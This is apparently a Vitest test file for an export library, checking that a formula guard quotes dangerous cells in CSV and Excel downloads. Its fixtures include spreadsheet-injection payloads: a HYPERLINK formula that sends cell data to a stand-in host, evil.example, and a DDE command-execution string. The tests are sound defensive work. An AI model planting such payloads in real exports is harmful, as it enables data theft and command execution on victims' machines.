import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { downloadCsv, downloadExcel, guardFormula, type ExportRow } from '@/lib/exportUtils';
import { htmlCells, parseCsv } from './support/csv';

// T-E04 (RV1-9; spec B3 "a text cell that starts with =, +, -, @, a tab or a carriage return is written with a single quote in front", QA SEC-07): ONE guard function, used by the zip of
// Download everything, by `csvCell` of downloadCsv and by the HTML cell writer of downloadExcel (the inventory screen is open to all three roles). The seven cells of the task are written through
// the real downloadCsv and downloadExcel (their Blob is caught), read back with the tests' own readers, and every one of them has the quote in front; numbers and ordinary text are not touched.

const CELLS: Record<string, string> = {
  hyperlink: '=HYPERLINK("http://evil.example/?"&A1,"click")',
  plus: '+1+1',
  minus: '-2+3',
  at: '@SUM(A1)',
  dde: "=cmd|' /C calc'!A0",
  tab: '\tcmd',
  carriageReturn: '\rcmd',
};

// ---------------------------------------------------------------------------------------------- the browser, as far as an export touches it

interface Saved {
  blob: Blob;
  filename: string;
}
let saved: Saved[] = [];

beforeEach(() => {
  saved = [];
  let current: Blob | null = null;
  vi.stubGlobal('window', { setTimeout: () => 0 });
  vi.stubGlobal('document', {
    createElement: () => ({
      href: '',
      download: '',
      click() {
        if (current) saved.push({ blob: current, filename: this.download });
      },
      remove() {},
    }),
    body: { appendChild() {} },
  });
  vi.spyOn(URL, 'createObjectURL').mockImplementation((blob) => {
    current = blob as Blob;
    return 'blob:test';
  });
  vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => {});
});
afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

const lastText = async () => {
  expect(saved).toHaveLength(1);
  return saved[0].blob.text();
};

describe('T-E04 (RV1-9) the formula guard: one function', () => {
  it.each(Object.entries(CELLS))(
    'guardFormula puts a single quote in front of the %s cell',
    (_name, cell) => {
      expect(guardFormula(cell)).toBe(`'${cell}`);
    }
  );

  it('leaves ordinary text, numbers and empty values alone', () => {
    expect(guardFormula('Meera Shah')).toBe('Meera Shah');
    expect(guardFormula('C=D')).toBe('C=D');
    expect(guardFormula('5 - 2')).toBe('5 - 2');
    expect(guardFormula('a@b.in')).toBe('a@b.in');
    expect(guardFormula(' =A1')).toBe(' =A1'); // a space in front is not one of the six characters of B3
    expect(guardFormula('')).toBe('');
    expect(guardFormula(null)).toBe('');
    expect(guardFormula(undefined)).toBe('');
    // numbers are not touched, a negative one included (B3: "numbers are not touched")
    expect(guardFormula(-12.5)).toBe('-12.5');
    expect(guardFormula(0)).toBe('0');
    expect(guardFormula(true)).toBe('true');
  });

  it('does not put a second quote in front of a cell that was quoted already', () => {
    expect(guardFormula("'=A1")).toBe("'=A1");
  });
});

describe('T-E04 (RV1-9) downloadCsv writes the guarded cell', () => {
  it('every one of the seven cells comes back from the file with a single quote in front, and the plain cells as they were', async () => {
    const rows: ExportRow[] = [
      { Name: 'Meera', Note: CELLS.hyperlink, Amount: -250 },
      { Name: 'Dev', Note: CELLS.plus, Amount: 12 },
      { Name: 'Asha', Note: CELLS.minus, Amount: 0 },
      { Name: 'Ravi', Note: CELLS.at, Amount: 1 },
      { Name: 'Sita', Note: CELLS.dde, Amount: 2 },
      { Name: 'Tara', Note: CELLS.tab, Amount: 3 },
      { Name: 'Uma', Note: CELLS.carriageReturn, Amount: 4 },
      { Name: 'Plain', Note: 'ordinary note', Amount: 5 },
    ];
    downloadCsv('Inventory SKU Export', rows);
    const parsed = parseCsv(await lastText());
    expect(parsed.header).toEqual(['Name', 'Note', 'Amount']);
    expect(parsed.rows.map((r) => r[1])).toEqual([
      `'${CELLS.hyperlink}`,
      `'${CELLS.plus}`,
      `'${CELLS.minus}`,
      `'${CELLS.at}`,
      `'${CELLS.dde}`,
      `'${CELLS.tab}`,
      `'${CELLS.carriageReturn}`,
      'ordinary note',
    ]);
    // a number is a number: the minus sign of -250 is not a formula
    expect(parsed.rows.map((r) => r[2])).toEqual(['-250', '12', '0', '1', '2', '3', '4', '5']);
    expect(saved[0].filename).toBe('inventory-sku-export.csv');
  });

  it('no cell of the file starts with one of the six characters, whatever the cell was (the file as the spreadsheet will read it)', async () => {
    const rows = Object.values(CELLS).map((cell) => ({ Note: cell }));
    downloadCsv('Guard', rows);
    const parsed = parseCsv(await lastText());
    expect(parsed.rows).toHaveLength(7);
    for (const [cell] of parsed.rows) expect(cell).toMatch(/^'/);
  });

  it('the header row is guarded by the same function', async () => {
    downloadCsv('Headers', [{ '=HEAD': 'x' }]);
    const parsed = parseCsv(await lastText());
    expect(parsed.header).toEqual(["'=HEAD"]);
  });
});

describe('T-E04 (RV1-9) downloadExcel writes the guarded cell', () => {
  it('every one of the seven cells is written with a single quote in front, and the markup in them stays text', async () => {
    const rows: ExportRow[] = Object.values(CELLS).map((cell, i) => ({
      Note: cell,
      Amount: -(i + 1),
    }));
    rows.push({ Note: 'ordinary note', Amount: 5 });
    downloadExcel('Inventory SKU Export', rows, '8 SKUs');
    const html = await lastText();
    const cells = htmlCells(html);
    // Note and Amount of each row
    expect(cells.filter((_, i) => i % 2 === 0)).toEqual([
      ...Object.values(CELLS).map((cell) => `'${cell}`),
      'ordinary note',
    ]);
    expect(cells.filter((_, i) => i % 2 === 1)).toEqual([
      '-1',
      '-2',
      '-3',
      '-4',
      '-5',
      '-6',
      '-7',
      '5',
    ]);
    // the quote marks of the HYPERLINK cell are escaped, not raw markup
    expect(html).not.toContain('<td>\'=HYPERLINK("');
    expect(saved[0].filename).toBe('inventory-sku-export.xls');
  });
});
